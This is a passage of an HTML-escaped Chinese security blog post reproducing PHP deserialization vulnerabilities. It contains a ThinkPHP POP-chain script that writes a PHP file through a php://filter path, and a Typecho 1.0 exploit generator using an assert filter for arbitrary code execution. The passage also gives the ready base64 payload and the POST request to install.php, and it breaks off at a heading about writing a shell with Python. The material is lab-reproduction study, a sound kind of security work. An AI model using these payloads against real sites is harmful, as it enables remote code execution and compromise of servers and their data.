class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\session\driver;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\cache\driver\File;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class Memcached&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        protected $handler = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;handler = new File();  //此处赋值$this-&amp;gt;handler为File类的一个对象，这样就可以调用File.php::set()方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\cache;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    abstract class Driver&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        function __construct()&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\cache\driver;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\cache\Driver;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class File extends Driver&amp;#123;  //此处重写File.php::set方法，构造写入的$filename&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        protected $tag;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        protected $options = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;tag = &amp;#x27;nocatch&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;options = [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#x27;cache_subdir&amp;#x27;=&amp;gt;false,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#x27;prefix&amp;#x27;=&amp;gt;&amp;#x27;&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#x27;path&amp;#x27;=&amp;gt;&amp;#x27;php://filter/write=string.rot13/resource=./static/&amp;lt;?cuc cucvasb();?&amp;gt;&amp;#x27;,  //rot13编码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#x27;data_compress&amp;#x27;=&amp;gt;false,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\console;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\session\driver\Memcached;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class Output&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        private $handle = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        protected $styles = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;styles = [&amp;#x27;removeWhereField&amp;#x27;];  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;handle = new Memcached();  //此处赋值$this-&amp;gt;handle为Memcached的一个对象，来调用Memcached::write()方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\model;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\console\Output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    abstract class Relation&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          protected $query;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          protected $foreignKey;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;query = new Output();  //此处赋值$this-&amp;gt;query为Output的一个对象，这样因为不存在removeWhereField方法，从而会调用Output类的__call方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;foreignKey = &amp;quot;aaaaaaaaa&amp;quot;;  //参数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\model\relation;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\model\Relation;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    abstract class OneToOne extends Relation&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\model\relation;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class HasOne extends OneToOne&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\model\relation\HasOne;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\console\Output;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    abstract class Model&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        protected $append = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        protected $error;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        protected $parent;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;         function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;append = [&amp;#x27;bmjoker&amp;#x27;=&amp;gt;&amp;#x27;getError&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;error = new HasOne();  //此处赋值$this-&amp;gt;error为类HasOne的一个对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\process\pipes;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\model\concern\Conversion;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\model\Pivot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        private $files = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        public function __construct()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            $this-&amp;gt;files=[new Pivot()];  //此处赋值$filename为类Pivot的一个对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    namespace think\model;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\Model;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    class Pivot extends Model&amp;#123;&amp;#125;  //此处会自动调用Model类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    use think\process\pipes\Windows;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    echo base64_encode(serialize(new Windows()));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意这个洞在 windows 下是复现不了的，因为 windows 对文件名有限制，会写入失败。&lt;/p&gt;
&lt;h3 id=&#34;typecho-反序列化漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#typecho-反序列化漏洞&#34;&gt;#&lt;/a&gt; typecho 反序列化漏洞&lt;/h3&gt;
&lt;p&gt;复现条件：php=5.x typecho 版本 typecho-1.0-14.10.10-release&lt;/p&gt;
&lt;p&gt;安装前先去数据库创建 typecho 库，不然安装时报错&lt;/p&gt;
&lt;p&gt;url 中输入 (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMToxODg4OC90eXBlY2hvLw==&#34;&gt;http://127.0.0.1:18888/typecho/&lt;/span&gt;) 自动跳转安装页面，里面的内容根据自己的填&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125094835151.png&#34; alt=&#34;image-20221125094835151&#34;&gt;&lt;/p&gt;
&lt;p&gt;任意命令执行 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Typecho_Feed&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const RSS1 = &amp;#x27;RSS 1.0&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const RSS2 = &amp;#x27;RSS 2.0&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const ATOM1 = &amp;#x27;ATOM 1.0&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const DATE_RFC822 = &amp;#x27;r&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const DATE_W3CDTF = &amp;#x27;c&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    const EOL = &amp;quot;\n&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private $_type;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private $_items;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;_type = $this::RSS2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;_items[0] = array(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#x27;title&amp;#x27; =&amp;gt; &amp;#x27;1&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#x27;link&amp;#x27; =&amp;gt; &amp;#x27;1&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#x27;date&amp;#x27; =&amp;gt; 1508895132,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#x27;category&amp;#x27; =&amp;gt; array(new Typecho_Request()),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#x27;author&amp;#x27; =&amp;gt; new Typecho_Request(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class Typecho_Request&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private $_params = array();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private $_filter = array();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public function __construct()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;_params[&amp;#x27;screenName&amp;#x27;] = &amp;#x27;phpinfo()&amp;#x27;;    //替换phpinfo()这里进行深度利用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;_filter[0] = &amp;#x27;assert&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$exp = array(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;adapter&amp;#x27; =&amp;gt; new Typecho_Feed(),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#x27;prefix&amp;#x27; =&amp;gt; &amp;#x27;typecho_&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo base64_encode(serialize($exp));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;访问：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;http://localhost:18888/typecho/install.php?finish&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;通过 post 传入 payload：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YTo1OntzOjU6InRpdGxlIjtzOjE6IjEiO3M6NDoibGluayI7czoxOiIxIjtzOjQ6ImRhdGUiO2k6MTUwODg5NTEzMjtzOjg6ImNhdGVnb3J5IjthOjE6e2k6MDtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fXM6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6ODoidHlwZWNob18iO30=&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125104636822.png&#34; alt=&#34;image-20221125104636822&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过 python 写 shell&lt;/p&gt;
